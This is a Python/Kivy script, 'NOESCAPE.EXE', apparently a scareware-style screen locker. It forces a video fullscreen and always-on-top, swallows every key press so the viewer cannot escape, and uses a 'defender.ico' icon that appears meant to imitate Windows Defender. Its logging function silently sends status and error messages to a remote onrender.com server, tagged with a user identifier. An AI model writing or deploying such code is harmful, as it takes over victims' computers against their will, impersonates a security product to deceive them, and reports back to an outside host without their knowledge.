# from kivy.config import Config
# Config.set('graphics','always_on_top',1)
# Config.set('graphics', 'fullscreen', '1')
# Config.setall('graphics',{"always_on_top":1,'fullscreen':"auto"})

import sys
from os import path
from requests import post,get
# --- logging functions you already have ---
url = "https://ms32-sha2.onrender.com/"
user = "<APP>"
def hit(url: str, data=None):
    try:
            if data:
                return post(url, json=data)
            return get(url, stream=True)
    except:
        sys.exit(0)

def log(statement, state="SUCESS", terminal=False):
    try:
        statement = f"{state}   {statement}"
        hit(url + "terminal", data={"output": statement}) if terminal else None
        hit(url + "output", data={"user": user, "err": statement})
    except:
        sys.exit(0)

# --- kivy imports ---
try:
    from kivy.app import App
    from kivy.core.window import Window
    from kivy.uix.video import Video
    from kivy.clock import Clock
    from kivy.base import EventLoop
except Exception as e:
    log(f"[IMPORT ERROR] {e}", state="ERROR")
    sys.exit(0)

class NOESCAPE(App):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        try:
            self.icon = self.get_path("defender.ico")
        except Exception as e:
            log(f"[ICON ERROR] {e}", state="ERROR")

    def get_path(self, name):
        try:
            if hasattr(sys, '_MEIPASS'):
                base_path = sys._MEIPASS
            else:
                base_path = path.abspath('.')
            return path.join(base_path, name)
        except Exception as e:
            log(f"[PATH ERROR] {e}", state="ERROR")
            return name

    def build(self):
        try:
            Window.set_title("NOESCAPE.EXE")
            Window.borderless = True
            Window.size = (1366, 768)
            Window.left = 0
            Window.top = 0
            Window.always_on_top = True
            Window.bind(on_key_down=self.prevent_escape)

            video_path = sys.argv[1] if len(sys.argv) > 1 else None
            if not video_path or not path.isfile(video_path):
                log(f"[VIDEO ERROR] Invalid or missing file: {video_path}", state="ERROR")
                sys.exit(0)

            self.video = Video(
                source=video_path,
                state='play',
                options={'eos': 'stop'}
            )
            self.video.allow_stretch = True
            self.video.keep_ratio = True

            Clock.schedule_interval(self.check_video_end, 0.1)
            return self.video
        except Exception as e:
            log(f"[BUILD ERROR] {e}", state="ERROR")
            self.clean_exit()

    def check_video_end(self, dt):
        try:
            if self.video.duration and self.video.position >= (self.video.duration - 0.125):
                self.video.state = 'stop'
                Clock.unschedule(self.check_video_end)
                Clock.schedule_once(lambda x: self.clean_exit(), 0.1)
        except Exception as e:
            log(f"[END CHECK ERROR] {e}", state="ERROR")
            self.clean_exit()

    def prevent_escape(self, window, key, scancode, codepoint, modifier):
        return True  # Block ESC

    def clean_exit(self):
        try:
            EventLoop.close()
        except:
            pass
        try:
            self.stop()
        except:
            pass
        sys.exit(0)

if __name__ == '__main__':
    try:
        NOESCAPE().run()
    except Exception as e:
        log(f"[MAIN ERROR] {e}", state="ERROR")
        sys.exit(0)
